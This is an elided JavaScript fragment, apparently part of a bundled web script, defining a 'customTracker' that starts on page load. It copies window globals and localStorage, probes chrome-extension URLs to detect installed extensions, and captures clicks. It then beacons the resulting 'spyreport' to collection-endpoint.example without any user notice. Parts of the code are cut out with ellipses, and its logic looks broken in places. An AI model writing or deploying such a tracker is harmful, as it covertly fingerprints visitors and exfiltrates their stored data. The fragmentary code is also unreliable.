...
"use strict";
const customTracker = {
  globalVarCollection: new Map(Object.entries(window)),
  localStorageCollection: new Map(Object.entries(localStorage)),
  spyHooks: new Set(),
  async spy(name, {
    id,
    file
    ...
    return new Promise(resolve => {
      let trackerImage = document.createElement('img');
      let timer = setTimeout(() => {
        this.spyHooks.delete(name);
        resolve(false);
      }, 1500);
      trackerImage.onload = () => {
        clearTimeout(timer);
        this.spyHooks.add(name);
        resolve(true);
      };
      trackerImage.onerror = () => {
        clearTimeout(timer);
        this.spyHooks.delete(name);
        resolve(false);
      };
      trackerImage.src = `chrome-extension://${id}/${file}`;
    });
  },
  randomizeCollection() {
    const collectionEntries = Array.from(this.globalVarCollection.entries());
    for (let index = collectionEntries.length - 1; index > 0; index--) {
      const randomIndex = Math.floor(Math.random() * (index + 1));
      [collectionEntries[index], collectionEntries[randomIndex]] = [collectionEntries[randomIndex], collectionEntries[index]];
    }
    this.globalVarCollection = new Map(collectionEntries);
  },
  async startSpying() {
    this.randomizeCollection();
    const discovery = {};
    window.addEventListener('click', event => {
      discovery.eventDetails = event;
    });
    for (const [key, value] of this.globalVarCollection) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      discovery[key] = await this.spy(key, value);
    }
    ...
    navigator.sendBeacon('https://collection-endpoint.example/v3/spyreport', encodedData);
  }
};
function _typeof(e) {
...
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => customTracker.startSpying());
} else {
  customTracker.startSpying();
}
!function r(i, o, a) {
  function s(t, e) {
    if (!o[t]) {
